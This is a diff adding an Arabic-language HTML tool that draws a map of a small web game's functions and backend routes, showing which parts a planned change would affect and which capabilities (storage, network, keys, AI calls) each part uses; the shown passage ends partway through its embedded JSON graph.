@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>خريطة الأثر</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+/* Layout idea: the real map of the game first, controls and the ready-made message under it, proof of accuracy last. */
+:root {
+  --bg: #eef1f4; --surface: #ffffff; --ink: #17212b; --muted: #5a6876; --line: #c9d2db;
+  --target: #1f5fbf;   --target-bg: #dce8fa;
+  --removed: #c62828;  --removed-bg: #fbe1e1;
+  --direct: #c2620a;   --direct-bg: #fde8cf;
+  --indirect: #9a7b00; --indirect-bg: #fbf3cc;
+  --safe: #2e7d4f;     --safe-bg: #e2f2e8;
+  --font: "IBM Plex Sans Arabic", system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0f151b; --surface: #17202a; --ink: #e8edf2; --muted: #93a1af; --line: #31404f;
+    --target: #6ea3f2; --target-bg: #1b2f4d; --removed: #ff7b7b; --removed-bg: #4a2023;
+    --direct: #f0a04b; --direct-bg: #45300f; --indirect: #e3c84f; --indirect-bg: #3b3510;
+    --safe: #62c28a; --safe-bg: #17352a; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0f151b; --surface: #17202a; --ink: #e8edf2; --muted: #93a1af; --line: #31404f;
+  --target: #6ea3f2; --target-bg: #1b2f4d; --removed: #ff7b7b; --removed-bg: #4a2023;
+  --direct: #f0a04b; --direct-bg: #45300f; --indirect: #e3c84f; --indirect-bg: #3b3510;
+  --safe: #62c28a; --safe-bg: #17352a; color-scheme: dark;
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; }
+body { background: var(--bg); color: var(--ink); font-family: var(--font); line-height: 1.6; }
+.app { max-width: 1040px; margin: 0 auto; padding: 20px 16px 40px; display: grid; gap: 16px; }
+header h1 { margin: 0 0 4px; font-size: 1.5rem; text-wrap: balance; }
+header p { margin: 0; color: var(--muted); max-width: 62ch; }
+.cols { display: grid; gap: 16px; align-items: start; }
+@media (min-width: 900px) { .cols { grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); } }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: 14px; padding: 12px; }
+#map { display: block; width: 100%; height: auto; max-width: 600px; margin: 0 auto; }
+.legend { list-style: none; display: flex; flex-wrap: wrap; gap: 6px 14px; margin: 8px 4px 2px; padding: 0; font-size: .8125rem; color: var(--muted); }
+.legend li { display: flex; align-items: center; gap: 6px; }
+.dot { width: 14px; height: 14px; border-radius: 4px; border: 2px solid; display: inline-block; }
+.dot.target { background: var(--target-bg); border-color: var(--target); }
+.dot.removed { background: var(--removed-bg); border-color: var(--removed); }
+.dot.direct { background: var(--direct-bg); border-color: var(--direct); }
+.dot.indirect { background: var(--indirect-bg); border-color: var(--indirect); border-style: dashed; }
+.dot.safe { background: var(--safe-bg); border-color: var(--safe); }
+
+.node { cursor: pointer; outline: none; }
+.node rect.box { fill: var(--surface); stroke: var(--line); stroke-width: 1.5; }
+.node text { fill: var(--ink); font-family: var(--font); font-weight: 500; pointer-events: none; }
+.node text.sub { font-size: 9.5px; font-weight: 600; opacity: .85; }
+.node.area rect.box { stroke-width: 2; }
+.node.area text.t { font-weight: 700; }
+.node.core rect.box { fill: var(--ink); stroke: var(--ink); }
+.node.core text { fill: var(--bg); font-weight: 700; }
+.node.st-safe rect.box { fill: var(--safe-bg); stroke: var(--safe); }
+.node.st-target rect.box { fill: var(--target-bg); stroke: var(--target); stroke-width: 2.5; }
+.node.st-removed rect.box { fill: var(--removed-bg); stroke: var(--removed); stroke-width: 2.5; }
+.node.st-direct rect.box { fill: var(--direct-bg); stroke: var(--direct); stroke-width: 2; }
+.node.st-indirect rect.box { fill: var(--indirect-bg); stroke: var(--indirect); stroke-width: 2; stroke-dasharray: 4 3; }
+.node rect.ring { fill: none; stroke: var(--ink); stroke-width: 1.5; opacity: 0; }
+.node.sel rect.ring { opacity: 1; }
+.node:focus-visible rect.ring { opacity: 1; stroke: var(--target); stroke-width: 3; }
+.badge circle { stroke: var(--surface); stroke-width: 1.5; }
+.badge text { fill: #fff; font-size: 10px; font-weight: 700; text-anchor: middle; dominant-baseline: central; }
+.b-removed circle { fill: var(--removed); } .b-direct circle { fill: var(--direct); }
+.b-indirect circle { fill: var(--indirect); } .b-target circle { fill: var(--target); } .b-safe circle { fill: var(--safe); }
+.tree-edge { fill: none; stroke: var(--line); stroke-width: 1.8; stroke-linecap: round; }
+.flow-edge { fill: none; stroke: var(--muted); stroke-width: 1.6; stroke-dasharray: 5 4; }
+#arrowhead path { fill: var(--muted); }
+@media (prefers-reduced-motion: no-preference) { .node rect.box { transition: fill .15s, stroke .15s; } }
+
+.panel { display: grid; gap: 14px; }
+.panel h2 { margin: 0; font-size: 1.25rem; }
+.sel-desc { margin: 2px 0 0; color: var(--muted); }
+.summary { margin: 0; padding: 10px 12px; border-radius: 10px; background: var(--bg); font-weight: 600; line-height: 1.7; }
+.unit span { display: block; }
+details { border: 1px solid var(--line); border-radius: 10px; padding: 8px 12px; }
+details summary { cursor: pointer; font-weight: 600; }
+details[open] summary { margin-bottom: 10px; }
+.where { margin: 4px 0 0; font-size: .8125rem; color: var(--muted); direction: ltr; text-align: right; unicode-bidi: plaintext; }
+.seg { display: grid; grid-template-columns: 1fr 1fr; border: 1px solid var(--line); border-radius: 10px; overflow: hidden; }
+.seg button { font: inherit; font-weight: 600; padding: 9px 12px; background: transparent; color: var(--ink); border: 0; cursor: pointer; }
+.seg button + button { border-inline-start: 1px solid var(--line); }
+.seg button[aria-pressed="true"] { background: var(--ink); color: var(--bg); }
+.seg button:focus-visible, .copy:focus-visible, textarea:focus-visible, summary:focus-visible { outline: 3px solid var(--target); outline-offset: 2px; }
+label { font-weight: 600; display: block; margin-bottom: 4px; }
+textarea { width: 100%; font: inherit; color: var(--ink); background: var(--bg); border: 1px solid var(--line); border-radius: 10px; padding: 10px 12px; resize: vertical; }
+.chips { display: flex; flex-wrap: wrap; gap: 8px; }
+.chip { padding: 3px 10px; border-radius: 999px; font-size: .8125rem; font-weight: 600; border: 1.5px solid; }
+.chip.removed { background: var(--removed-bg); border-color: var(--removed); color: var(--removed); }
+.chip.target { background: var(--target-bg); border-color: var(--target); color: var(--target); }
+.chip.direct { background: var(--direct-bg); border-color: var(--direct); color: var(--direct); }
+.chip.indirect { background: var(--indirect-bg); border-color: var(--indirect); color: var(--indirect); border-style: dashed; }
+.chip.safe { background: var(--safe-bg); border-color: var(--safe); color: var(--safe); }
+.group h3 { margin: 0 0 4px; font-size: .9375rem; }
+.group ul { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; }
+.group li { padding: 8px 10px; border-radius: 10px; border-inline-start: 4px solid; background: var(--bg); }
+.group li b { display: block; }
+.group li .fn { font-weight: 500; }
+.group li span { color: var(--muted); font-size: .875rem; }
+.ltr { direction: ltr; unicode-bidi: isolate; display: inline-block; }
+.g-removed li { border-color: var(--removed); } .g-direct li { border-color: var(--direct); } .g-indirect li { border-color: var(--indirect); }
+.safe-line { margin: 0; color: var(--muted); font-size: .9375rem; }
+.msg-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+.msg-head h3 { margin: 0; font-size: 1rem; }
+.copy { font: inherit; font-weight: 600; padding: 7px 14px; border-radius: 10px; border: 0; background: var(--target); color: #fff; cursor: pointer; }
+:root[data-theme="dark"] .copy { color: #0b1420; }
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) .copy { color: #0b1420; } }
+#msg { line-height: 1.75; min-height: 11rem; }
+.note { margin: 0; color: var(--muted); font-size: .8125rem; }
+
+[hidden] { display: none !important; }
+.stack { display: grid; gap: 16px; }
+.tabs { display: grid; grid-template-columns: 1fr 1fr; border: 1px solid var(--line); border-radius: 12px; overflow: hidden; background: var(--surface); }
+.tabs button { font: inherit; font-weight: 600; padding: 11px 12px; background: transparent; color: var(--ink); border: 0; cursor: pointer; }
+.tabs button + button { border-inline-start: 1px solid var(--line); }
+.tabs button[aria-pressed="true"] { background: var(--ink); color: var(--bg); }
+.tabs button:focus-visible { outline: 3px solid var(--target); outline-offset: -3px; }
+.appr { display: grid; gap: 14px; }
+.appr h2 { margin: 0; font-size: 1.25rem; }
+.appr .lead { margin: 0; padding: 12px 14px; border-radius: 12px; background: var(--bg); font-weight: 600; line-height: 1.8; border-inline-start: 5px solid var(--removed); }
+.appr .demo { margin: 0; padding: 8px 12px; border-radius: 10px; background: var(--indirect-bg); border: 1px dashed var(--indirect); color: var(--ink); font-size: .875rem; }
+.rule { padding: 10px 12px; border-radius: 10px; border-inline-start: 5px solid; background: var(--bg); display: grid; gap: 2px; }
+.rule b { font-weight: 600; }
+.rule .worst { font-size: .9375rem; }
+.rule .meta { color: var(--muted); font-size: .8125rem; }
+.rule code { direction: ltr; unicode-bidi: isolate; display: inline-block; font-size: .8125rem; color: var(--muted); }
+.r-red { border-color: var(--removed); } .r-yellow { border-color: var(--direct); } .r-green { border-color: var(--safe); }
+.appr h3 { margin: 6px 0 4px; font-size: .9375rem; }
+.proof h2 { margin: 0 0 6px; font-size: 1.125rem; }
+.proof p { margin: 0 0 8px; }
+.proof ul { margin: 0 0 8px; padding-inline-start: 1.2rem; display: grid; gap: 4px; }
+.big { display: flex; flex-wrap: wrap; gap: 10px; margin: 8px 0 12px; }
+.big div { flex: 1 1 130px; border: 1px solid var(--line); border-radius: 12px; padding: 8px 12px; background: var(--bg); }
+.big strong { display: block; font-size: 1.5rem; font-variant-numeric: tabular-nums; line-height: 1.2; }
+.big span { color: var(--muted); font-size: .8125rem; }
+
+/* permissions mode: same map, hacker look */
+body.hack { --bg: #010603; --surface: #04110a; --ink: #c4ffd6; --muted: #5cc487; --line: #0e4a26;
+  --target: #39ff14; --target-bg: #06260f; --removed: #ff4d5e; --removed-bg: #2a0a10; --direct: #ffb020; --direct-bg: #2b1d03;
+  --indirect: #d7e34a; --indirect-bg: #242806; --safe: #39ff14; --safe-bg: #04230d;
+  --font: "IBM Plex Mono", "IBM Plex Sans Arabic", ui-monospace, Consolas, monospace; color-scheme: dark;
+  background-image: linear-gradient(rgba(57,255,20,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(57,255,20,.05) 1px, transparent 1px); background-size: 28px 28px; }
+body.hack::before { content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 50; background: repeating-linear-gradient(0deg, rgba(0,0,0,0) 0 2px, rgba(0,0,0,.16) 2px 3px); }
+body.hack h1, body.hack h2 { color: #39ff14; text-shadow: 0 0 10px rgba(57,255,20,.5); }
+body.hack .card { box-shadow: 0 0 0 1px rgba(57,255,20,.08), 0 0 24px rgba(57,255,20,.07); }
+body.hack .tabs button[aria-pressed="true"] { background: #39ff14; color: #02140a; }
+body.hack .tree-edge { stroke: #1c7a3f; filter: drop-shadow(0 0 2px rgba(57,255,20,.6)); }
+body.hack .node.core rect.box { fill: #06260f; stroke: #39ff14; filter: drop-shadow(0 0 6px rgba(57,255,20,.7)); }
+body.hack .node.core text { fill: #39ff14; }
+.node.pm-ok rect.box { fill: var(--safe-bg); stroke: var(--safe); filter: drop-shadow(0 0 3px rgba(57,255,20,.55)); }
+.node.pm-watch rect.box { fill: var(--direct-bg); stroke: var(--direct); stroke-width: 2; filter: drop-shadow(0 0 4px rgba(255,176,32,.6)); }
+.node.pm-danger rect.box { fill: var(--removed-bg); stroke: var(--removed); stroke-width: 2.5; filter: drop-shadow(0 0 6px rgba(255,77,94,.75)); }
+body.hack .node text.sub { font-size: 9px; letter-spacing: .02em; }
+body.hack .appr, body.hack .rule { background: rgba(57,255,20,.04); }
+.legend .tags { flex-basis: 100%; font-size: .75rem; }
+.prompt { margin: 0; color: #39ff14; font-family: "IBM Plex Mono", ui-monospace, Consolas, monospace; font-size: .875rem; direction: ltr; text-align: left; }
+.prompt::after { content: "\25AE"; margin-inline-start: 4px; }
+@media (prefers-reduced-motion: no-preference) { .prompt::after { animation: blink 1.1s steps(2, start) infinite; } @keyframes blink { to { visibility: hidden; } } }
+.demo { margin: 0; padding: 8px 12px; border-radius: 10px; background: var(--indirect-bg); border: 1px dashed var(--indirect); font-size: .875rem; }
+.lead { margin: 0; padding: 12px 14px; border-radius: 12px; background: var(--bg); font-weight: 600; line-height: 1.8; border-inline-start: 5px solid var(--removed); }
+#permMap { display: block; width: 100%; height: auto; max-width: 600px; margin: 0 auto; }
+.rowbtn { cursor: pointer; }
+.rowbtn:hover { filter: brightness(1.2); }
+.rowbtn:focus-visible { outline: 3px solid var(--target); outline-offset: 2px; }
+.back { font: inherit; font-weight: 600; padding: 7px 14px; border-radius: 10px; border: 1px solid var(--target); background: transparent; color: var(--target); cursor: pointer; justify-self: start; }
+.back:focus-visible { outline: 3px solid var(--target); outline-offset: 2px; }
+.chain { margin: 0; padding: 8px 10px; border-radius: 10px; background: var(--bg); font-size: .9375rem; line-height: 1.8; }
+.titlerow { display: flex; gap: 8px; align-items: center; justify-content: space-between; flex-wrap: wrap; }
+#selName input { font: inherit; font-weight: 700; color: var(--ink); background: var(--bg); border: 1px solid var(--target); border-radius: 8px; padding: 4px 8px; width: 100%; min-width: 12ch; }
+</style>
+</head>
+<body>
+<main class="app">
+  <header>
+    <h1 id="projName">خريطة الأثر</h1>
+    <p id="intro"></p>
+    <p class="demo" id="limits" hidden></p>
+  </header>
+
+  <nav class="tabs" aria-label="العرض">
+    <button type="button" id="tabMap" aria-pressed="true">خريطة المشروع</button>
+    <button type="button" id="tabAppr" aria-pressed="false">الصلاحيات</button>
+  </nav>
+
+  <p class="prompt" id="hackPrompt" hidden>$ claude --permissions --reach</p>
+
+  <div id="mapView" class="stack">
+  <div class="cols">
+    <section class="card" aria-label="خريطة اللعبة">
+      <svg id="map" role="group" aria-label="خريطة أجزاء اللعبة">
+        <defs>
+          <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto" markerUnits="userSpaceOnUse"><path d="M0,0 L8,4 L0,8 Z"></path></marker>
+        </defs>
+        <g id="treeLayer"></g><g id="flowLayer"></g><g id="nodeLayer"></g>
+      </svg>
+      <svg id="permMap" role="group" aria-label="خريطة الصلاحيات" hidden></svg>
+      <ul class="legend" id="legendMap" aria-label="دليل الألوان">
+        <li><span class="dot target"></span>ما ستعدّله</li>
+        <li><span class="dot removed"></span>ما سيُحذف</li>
+        <li><span class="dot direct"></span>يتأثر مباشرة</li>
+        <li><span class="dot indirect"></span>قد يتأثر</li>
+        <li><span class="dot safe"></span>سليم</li>
+      </ul>
+      <ul class="legend" id="legendHack" aria-label="دليل خريطة الصلاحيات" hidden>
+        <li><span class="dot removed"></span>خطر</li>
+        <li><span class="dot direct"></span>انتباه</li>
+        <li><span class="dot safe"></span>آمن</li>
+        <li class="tags">المركز ← الصلاحيات اللي سمحت فيها ← اضغط صلاحية لتشوف شو تفرّع منها ← الأجزاء اللي بتتأثر.</li>
+      </ul>
+    </section>
+
+    <section class="card panel" id="panel" aria-live="polite">
+      <div>
+        <div class="titlerow"><h2 id="selName"></h2><button type="button" class="back" id="renameBtn">غيّر الاسم</button></div>
+        <p class="sel-desc" id="selDesc"></p>
+        <p class="where" id="selWhere"></p>
+      </div>
+      <div class="seg" role="group" aria-label="نوع التغيير">
+        <button type="button" id="mModify" aria-pressed="true">تعديل</button>
+        <button type="button" id="mDelete" aria-pressed="false">حذف</button>
+      </div>
+      <p class="summary" id="summary"></p>
+      <div class="chips" id="chips"></div>
+      <div id="groups" style="display:grid;gap:12px"></div>
+    </section>
+    <section class="card panel" id="permPanel" aria-live="polite" hidden></section>
+  </div>
+
+  <section class="card proof" id="proof" aria-label="مدى دقة الخريطة"></section>
+  </div>
+
+</main>
+
+<script>
+(function () {
+  var NS = "http://www.w3.org/2000/svg";
+  var $ = function (id) { return document.getElementById(id); };
+  var G = {"nodes":[{"id":"top:index.html","name":"(page code)","file":"index.html","kind":"top","start":1,"parent":null,"caps":[]},{"id":"index.html:T@278","name":"T","file":"index.html","kind":"function","start":278,"parent":null,"caps":[]},{"id":"index.html:R@280","name":"R","file":"index.html","kind":"function","start":280,"parent":null,"caps":[]},{"id":"index.html:LEVELS@283","name":"LEVELS","file":"index.html","kind":"data","start":283,"parent":null,"caps":[]},{"id":"index.html:has@305","name":"has","file":"index.html","kind":"function","start":305,"parent":null,"caps":[]},{"id":"index.html:has@382","name":"has","file":"index.html","kind":"function","start":382,"parent":null,"caps":[]},{"id":"index.html:has@433","name":"has","file":"index.html","kind":"function","start":433,"parent":null,"caps":[]},{"id":"index.html:has@489","name":"has","file":"index.html","kind":"function","start":489,"parent":null,"caps":[]},{"id":"index.html:has@544","name":"has","file":"index.html","kind":"function","start":544,"parent":null,"caps":[]},{"id":"index.html:has@589","name":"has","file":"index.html","kind":"function","start":589,"parent":null,"caps":[]},{"id":"index.html:has@652","name":"has","file":"index.html","kind":"function","start":652,"parent":null,"caps":[]},{"id":"index.html:noneLine@686","name":"noneLine","file":"index.html","kind":"function","start":686,"parent":null,"caps":[]},{"id":"index.html:dailyBanned@688","name":"dailyBanned","file":"index.html","kind":"function","start":688,"parent":null,"caps":[]},{"id":"index.html:norm@693","name":"norm","file":"index.html","kind":"function","start":693,"parent":null,"caps":[]},{"id":"index.html:bannedHit@703","name":"bannedHit","file":"index.html","kind":"function","start":703,"parent":null,"caps":[]},{"id":"index.html:newState@712","name":"newState","file":"index.html","kind":"function","start":712,"parent":null,"caps":[]},{"id":"index.html:frWord@721","name":"frWord","file":"index.html","kind":"function","start":721,"parent":null,"caps":[]},{"id":"index.html:franco@736","name":"franco","file":"index.html","kind":"function","start":736,"parent":null,"caps":[]},{"id":"index.html:localParse@750","name":"localParse","file":"index.html","kind":"function","start":750,"parent":null,"caps":[]},{"id":"index.html:parseMulti@751","name":"parseMulti","file":"index.html","kind":"function","start":751,"parent":null,"caps":[]},{"id":"index.html:validActions@763","name":"validActions","file":"index.html","kind":"function","start":763,"parent":null,"caps":[]},{"id":"index.html:finalize@769","name":"finalize","file":"index.html","kind":"function","start":769,"parent":null,"caps":[]},{"id":"index.html:apply@779","name":"apply","file":"index.html","kind":"function","start":779,"parent":null,"caps":[]},{"id":"index.html:patchedCount@796","name":"patchedCount","file":"index.html","kind":"function","start":796,"parent":null,"caps":[]},{"id":"index.html:novelCount@801","name":"novelCount","file":"index.html","kind":"function","start":801,"parent":null,"caps":[]},{"id":"index.html:foundName@806","name":"foundName","file":"index.html","kind":"function","start":806,"parent":null,"caps":[]},{"id":"index.html:sanitizeActions@812","name":"sanitizeActions","file":"index.html","kind":"function","start":812,"parent":null,"caps":[]},{"id":"index.html:applyNovel@825","name":"applyNovel","file":"index.html","kind":"function","start":825,"parent":null,"caps":[]},{"id":"index.html:trDom@841","name":"trDom","file":"index.html","kind":"function","start":841,"parent":null,"caps":[]},{"id":"index.html:boot@850","name":"boot","file":"index.html","kind":"function","start":850,"parent":null,"caps":["STO"]},{"id":"index.html:$@851","name":"$","file":"index.html","kind":"function","start":851,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:lsGet@867","name":"lsGet","file":"index.html","kind":"function","start":867,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:lsSet@868","name":"lsSet","file":"index.html","kind":"function","start":868,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:loadPatched@869","name":"loadPatched","file":"index.html","kind":"function","start":869,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:savePatched@876","name":"savePatched","file":"index.html","kind":"function","start":876,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:cacheKey@877","name":"cacheKey","file":"index.html","kind":"function","start":877,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:cacheGet@878","name":"cacheGet","file":"index.html","kind":"function","start":878,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:cacheSet@879","name":"cacheSet","file":"index.html","kind":"function","start":879,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:loadBest@880","name":"loadBest","file":"index.html","kind":"function","start":880,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:saveBest@881","name":"saveBest","file":"index.html","kind":"function","start":881,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:loadStars@882","name":"loadStars","file":"index.html","kind":"function","start":882,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:saveStars@883","name":"saveStars","file":"index.html","kind":"function","start":883,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:setNarr@887","name":"setNarr","file":"index.html","kind":"function","start":887,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:getPid@888","name":"getPid","file":"index.html","kind":"function","start":888,"parent":"index.html:boot@850","caps":["STO"]},{"id":"index.html:api@898","name":"api","file":"index.html","kind":"function","start":898,"parent":"index.html:boot@850","caps":["NET"]},{"id":"index.html:ev@905","name":"ev","file":"index.html","kind":"function","start":905,"parent":"index.html:boot@850","caps":["NET"]},{"id":"index.html:ensureRun@909","name":"ensureRun","file":"index.html","kind":"function","start":909,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:serverTurn@915","name":"serverTurn","file":"index.html","kind":"function","start":915,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:dailyResult@932","name":"dailyResult","file":"index.html","kind":"function","start":932,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:el@934","name":"el","file":"index.html","kind":"function","start":934,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:toBottom@935","name":"toBottom","file":"index.html","kind":"function","start":935,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:keyCommand@942","name":"keyCommand","file":"index.html","kind":"function","start":942,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:b64e@943","name":"b64e","file":"index.html","kind":"function","start":943,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:b64d@944","name":"b64d","file":"index.html","kind":"function","start":944,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:challengeUrl@945","name":"challengeUrl","file":"index.html","kind":"function","start":945,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:found@946","name":"found","file":"index.html","kind":"function","start":946,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:runStars@947","name":"runStars","file":"index.html","kind":"function","start":947,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:starStr@948","name":"starStr","file":"index.html","kind":"function","start":948,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:siteLabel@949","name":"siteLabel","file":"index.html","kind":"function","start":949,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:shareText@950","name":"shareText","file":"index.html","kind":"function","start":950,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:rrect@955","name":"rrect","file":"index.html","kind":"function","start":955,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:drawCard@956","name":"drawCard","file":"index.html","kind":"function","start":956,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:shareCard@1000","name":"shareCard","file":"index.html","kind":"function","start":1000,"parent":"index.html:boot@850","caps":["CLIP"]},{"id":"index.html:waShare@1009","name":"waShare","file":"index.html","kind":"function","start":1009,"parent":"index.html:boot@850","caps":["CLIP"]},{"id":"index.html:copyLink@1010","name":"copyLink","file":"index.html","kind":"function","start":1010,"parent":"index.html:boot@850","caps":["CLIP"]},{"id":"index.html:done@1011","name":"done","file":"index.html","kind":"function","start":1011,"parent":"index.html:copyLink@1010","caps":[]},{"id":"index.html:applyChallenge@1016","name":"applyChallenge","file":"index.html","kind":"function","start":1016,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:beep@1038","name":"beep","file":"index.html","kind":"function","start":1038,"parent":"index.html:boot@850","caps":["SND"]},{"id":"index.html:streakNow@1051","name":"streakNow","file":"index.html","kind":"function","start":1051,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:renderMeters@1052","name":"renderMeters","file":"index.html","kind":"function","start":1052,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:pulse@1053","name":"pulse","file":"index.html","kind":"function","start":1053,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:toast@1055","name":"toast","file":"index.html","kind":"function","start":1055,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:nextToast@1056","name":"nextToast","file":"index.html","kind":"function","start":1056,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:burst@1061","name":"burst","file":"index.html","kind":"function","start":1061,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:tapeSlap@1070","name":"tapeSlap","file":"index.html","kind":"function","start":1070,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:buzz@1076","name":"buzz","file":"index.html","kind":"function","start":1076,"parent":"index.html:boot@850","caps":["SND"]},{"id":"index.html:earn@1077","name":"earn","file":"index.html","kind":"function","start":1077,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:touchDay@1083","name":"touchDay","file":"index.html","kind":"function","start":1083,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:unlocked@1092","name":"unlocked","file":"index.html","kind":"function","start":1092,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:renderLevels@1093","name":"renderLevels","file":"index.html","kind":"function","start":1093,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:updateHUD@1119","name":"updateHUD","file":"index.html","kind":"function","start":1119,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:renderChips@1145","name":"renderChips","file":"index.html","kind":"function","start":1145,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:intro@1155","name":"intro","file":"index.html","kind":"function","start":1155,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:addThinking@1168","name":"addThinking","file":"index.html","kind":"function","start":1168,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:typeInto@1169","name":"typeInto","file":"index.html","kind":"function","start":1169,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:addTurn@1176","name":"addTurn","file":"index.html","kind":"function","start":1176,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:afterTurn@1186","name":"afterTurn","file":"index.html","kind":"function","start":1186,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:closeEnd@1201","name":"closeEnd","file":"index.html","kind":"function","start":1201,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:showEnd@1202","name":"showEnd","file":"index.html","kind":"function","start":1202,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:btn@1246","name":"btn","file":"index.html","kind":"function","start":1246,"parent":"index.html:showEnd@1202","caps":[]},{"id":"index.html:newRound@1262","name":"newRound","file":"index.html","kind":"function","start":1262,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:turn@1273","name":"turn","file":"index.html","kind":"function","start":1273,"parent":"index.html:boot@850","caps":[]},{"id":"index.html:send@1322","name":"send","file":"index.html","kind":"function","start":1322,"parent":"index.html:boot@850","caps":[]},{"id":"top:worker.js","name":"(page code)","file":"worker.js","kind":"top","start":1,"parent":null,"caps":[]},{"id":"worker.js:day@11","name":"day","file":"worker.js","kind":"function","start":11,"parent":null,"caps":[]},{"id":"worker.js:num@12","name":"num","file":"worker.js","kind":"function","start":12,"parent":null,"caps":[]},{"id":"worker.js:cors@16","name":"cors","file":"worker.js","kind":"function","start":16,"parent":null,"caps":[]},{"id":"worker.js:reply@24","name":"reply","file":"worker.js","kind":"function","start":24,"parent":null,"caps":[]},{"id":"worker.js:sign@30","name":"sign","file":"worker.js","kind":"function","start":30,"parent":null,"caps":["KEY"]},{"id":"worker.js:norm@35","name":"norm","file":"worker.js","kind":"function","start":35,"parent":null,"caps":[]},{"id":"worker.js:db@47","name":"db","file":"worker.js","kind":"function","start":47,"parent":null,"caps":["DB"]},{"id":"worker.js:incr@59","name":"incr","file":"worker.js","kind":"function","start":59,"parent":null,"caps":["DB"]},{"id":"worker.js:getNum@66","name":"getNum","file":"worker.js","kind":"function","start":66,"parent":null,"caps":["DB"]},{"id":"worker.js:decr@70","name":"decr","file":"worker.js","kind":"function","start":70,"parent":null,"caps":["DB"]},{"id":"worker.js:cacheGet@73","name":"cacheGet","file":"worker.js","kind":"function","start":73,"parent":null,"caps":["DB"]},{"id":"worker.js:cachePut@77","name":"cachePut","file":"worker.js","kind":"function","start":77,"parent":null,"caps":["DB"]},{"id":"worker.js:sweep@80","name":"sweep","file":"worker.js","kind":"function","start":80,"parent":null,"caps":["DB"]},{"id":"worker.js:systemPrompt@86","name":"systemPrompt","file":"worker.js","kind":"function","start":86,"parent":null,"caps":[]},{"id":"worker.js:cleanReply@115","name":"cleanReply","file":"worker.js","kind":"function","start":115,"parent":null,"caps":[]},{"id":"worker.js:c@121","name":"c","file":"worker.js","kind":"function","start":121,"parent":"worker.js:cleanReply@115","caps":[]},{"id":"worker.js:callOpenAI@128","name":"callOpenAI","file":"worker.js","kind":"function","start":128,"parent":null,"caps":["AI"]},{"id":"worker.js:once@134","name":"once","file":"worker.js","kind":"function","start":134,"parent":"worker.js:callOpenAI@128","caps":["NET","KEY","AI"]},{"id":"worker.js:esc@154","name":"esc","file":"worker.js","kind":"function","start":154,"parent":null,"caps":[]},{"id":"worker.js:statsPage@155","name":"statsPage","file":"worker.js","kind":"function","start":155,"parent":null,"caps":["DB"]},{"id":"worker.js:handle@173","name":"handle","file":"worker.js","kind":"function","start":173,"parent":null,"caps":["KEY"]},{"id":"route:/e","name":"/e","file":"worker.js","kind":"route","start":185,"parent":null,"caps":["SRV"]},{"id":"route:/start","name":"/start","file":"worker.js","kind":"route","start":192,"parent"